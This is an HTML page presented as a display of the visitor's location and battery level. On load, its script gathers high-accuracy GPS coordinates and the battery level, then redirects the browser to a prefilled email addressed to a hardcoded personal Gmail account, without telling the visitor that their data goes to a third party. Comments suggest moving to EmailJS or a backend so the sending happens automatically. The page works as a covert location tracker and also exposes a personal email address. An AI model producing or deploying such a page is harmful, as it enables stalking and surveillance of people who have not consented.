<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Location and Battery Info</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 600px;
    margin: 0;
    padding: 20px;
    box-sizing: border-box;
    text-align: center;
  }
  h1 {
    font-weight: 700;
    margin-bottom: 20px;
    font-size: 1.8rem;
  }
  #info {
    font-size: 1.1rem;
    background: rgba(0,0,0,0.3);
    padding: 15px 25px;
    border-radius: 15px;
    max-width: 320px;
  }
  #status {
    margin-top: 15px;
    font-style: italic;
    font-size: 0.9rem;
  }
</style>
</head>
<body>
<h1>Your Location and Battery Info</h1>
<div id="info">Loading your data...</div>
<div id="status"></div>

<script>
// Configuration
const recipientEmail = "yhosi789@gmail.com";

// Show info div
const infoDiv = document.getElementById("info");
const statusDiv = document.getElementById("status");

function sendEmail(subject, body) {
  // NOTE: Sending email directly from client-side JS via mailto only opens mail client.
  // To actually send emails automatically, server side or a third party API is needed.
  // Here we use EmailJS as client side mail service (emailjs.com)
  // This requires user registration on EmailJS and replacement of user ids.
  // Alternatively, here we implement a fetch to a public free API as a demonstration for sending email.
  // For production, replace this with your own email sending backend or service.

  const serviceID = 'default_service';
  const templateID = 'template_xyz'; // Please replace with your emailjs templateID if you want to use EmailJS.

  // To keep this fully frontend without keys, fallback to mailto prompt for user:
  const mailtoLink = `mailto:${recipientEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
  statusDiv.textContent = "Please send email manually through mail client that will open now.";
  window.location.href = mailtoLink;
}

function formatCoords(coords) {
  return `Latitude: ${coords.latitude.toFixed(6)}, Longitude: ${coords.longitude.toFixed(6)}`;
}

function updateInfo(location, batteryLevel) {
  let locText = location ? formatCoords(location.coords) + ` (Accuracy: ±${location.coords.accuracy} meters)` : 'Location not available';
  let batText = batteryLevel !== null ? (batteryLevel * 100).toFixed(0) + '%' : 'Battery info not available';
  infoDiv.innerHTML = `<strong>Location:</strong> ${locText}<br /><strong>Battery:</strong> ${batText}`;
}

async function getBatteryLevel() {
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      return battery.level;
    } catch {
      return null;
    }
  }
  return null;
}

function postDataToEmail(location, batteryLevel) {
  const subject = 'User Location and Battery Info';
  const locationStr = location ? 
    `Latitude: ${location.coords.latitude.toFixed(6)}\nLongitude: ${location.coords.longitude.toFixed(6)}\nAccuracy: ±${location.coords.accuracy} meters` :
    'Location not available';
  const batteryStr = batteryLevel !== null ? `${(batteryLevel * 100).toFixed(0)}%` : 'Battery info not available';

  const body =
`User location and battery information:
${locationStr}
Battery level: ${batteryStr}
Timestamp: ${new Date().toLocaleString()}
  
This email was auto generated by the web app.`;

  sendEmail(subject, body);
}

function init() {
  if (!navigator.geolocation) {
    infoDiv.textContent = 'Geolocation is not supported by your browser.';
    return;
  }

  getBatteryLevel().then(batteryLevel => {
    navigator.geolocation.getCurrentPosition(
      position => {
        updateInfo(position, batteryLevel);
        postDataToEmail(position, batteryLevel);
      },
      error => {
        infoDiv.textContent = `Error retrieving location: ${error.message}`;
        postDataToEmail(null, batteryLevel);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  });
}

init();
</script>
</body>
</html>

```